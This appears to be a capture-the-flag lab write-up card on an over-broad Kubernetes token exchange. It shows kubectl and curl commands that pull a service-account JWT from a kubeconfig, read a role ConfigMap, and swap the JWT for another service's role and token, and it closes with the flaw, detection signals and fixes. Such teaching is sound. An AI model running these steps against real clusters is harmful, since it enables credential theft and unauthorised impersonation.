| | |
|---|---|
| **Vulnerability / bug class** | Over-broad token exchange — a workload JWT can be swapped for a role belonging to a *different* audience, and that role's record is returned |
| **Tools** | `kubectl`, `curl`, `jq` |
| **Attack surface** | `POST https://cloud-api.keplerops.test/api/token-exchange/fieldkest-export-access`; ConfigMap `fieldlink/role-export-access` |

**What you are about to read:** how an audience-name-trusting exchange lets a general workload
identity assume the role built for the export service, and how the returned role record plus its
token unlock the rest of the K15/K16 chain.

## Objective

> Use the workload trust relationship to establish the scoped role intended for another audience
> and retrieve its protected role record.

K14.1 told us which exchange we may ask for; this card is what comes back when we ask.

## Background you need

A token exchange is a *downscoping* primitive: bring a token with audience **A**, ask for audience
**B**, receive something narrower. The safety property is that the result must be constrained by
the **caller's identity**, not by the audience string in the URL. Two common mistakes:

- the exchange reads the audience/role from the request path and mints it for any valid JWT;
- the role record describing that audience sits in a broadly readable ConfigMap next to the
  exchange, so the delegation graph itself leaks.

Both appear here.

## Walkthrough

### 1. Read the binding that names the other audience

`rowan-dev` holds a kubeconfig whose credential is a service-account JWT for `fieldlink`:

```bash
SA_JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
kubectl -n fieldlink get configmap role-export-access -o yaml
```

Lane notes record that this ConfigMap is how the card was solved. It maps audience
`fieldkest-export-access` → role `role/support-export-editor` → the workload service account that
is *supposed* to consume it: the delegation graph in plain text.

### 2. Perform the exchange

```bash
curl -sS -X POST -H "Authorization: Bearer ${SA_JWT}" \
  -H 'Content-Type: application/json' \
  https://cloud-api.keplerops.test/api/token-exchange/fieldkest-export-access
```

```json
{
  "audience": "fieldkest-export-access",
  "role": "role/support-export-editor",
  "subject": "system:serviceaccount:fieldlink:svc-fieldlink-export",
  "token": "<k3s JWT>",
  "role_record": { "…": "delegated export / handover rights" }
}
```

- `audience` is the *other* consumer — the export service — yet a general workload obtained it.
- `subject` is `svc-fieldlink-export`: we now present as a service account that is not ours.
- `role_record` is the "protected role record" this card asks for, and the map for the next cards.

### 3. Getting the flag, and proving the token

The role record carried the flag; our copy of the card stores no value, so it is recorded as
"accepted, value not recorded". The token is real — it answers for jobs we do not own:

```bash
curl -sS -H "Authorization: Bearer ${EXPORT_JWT}" \
  https://cloud-api.keplerops.test/api/exports/EXP-2841            # K15.1
curl -sS -H "Authorization: Bearer ${EXPORT_JWT}" \
  https://cloud-api.keplerops.test/api/exports/EXP-2841/definition # K15.2
```

`/api/schedules/SCHED-2841` (K16.1) answers to the same role.

## Why this works (the vulnerability explained)

The exchange authenticates the caller but authorises on the **path parameter**. The requested
audience is an instruction, not a question checked against the caller's trust document, so any
workload with a token can name another consumer's audience and receive its role.

The second half is the readable role record: even without the token it enumerates delegated
rights — which jobs are reachable, which handover slots are writable. Metadata that describes
*who may act as whom* belongs in the same trust tier as the credentials it governs.

A correct exchange resolves the caller's service account, looks up its allowed audiences in its
trust record (K14.1's object), rejects anything not listed, caps the issued role at the
intersection with the caller's own maximum, and logs caller → audience → role.

## Detection and fix

- **Log signal:** exchanges where `caller_subject != issued_subject` for a role the caller never
  uses; one workload exchanging for several audiences in a short window; export-audience tokens
  used from the workstation subnet instead of the export pod.
- **Fix:** per-service-account audience allow-list, role intersection capping, short TTLs, an
  audit event per exchange. Move `role-export-access` into the control-plane policy store and drop
  `role_record` from the response. Rotate — the output is a working JWT for `svc-fieldlink-export`.
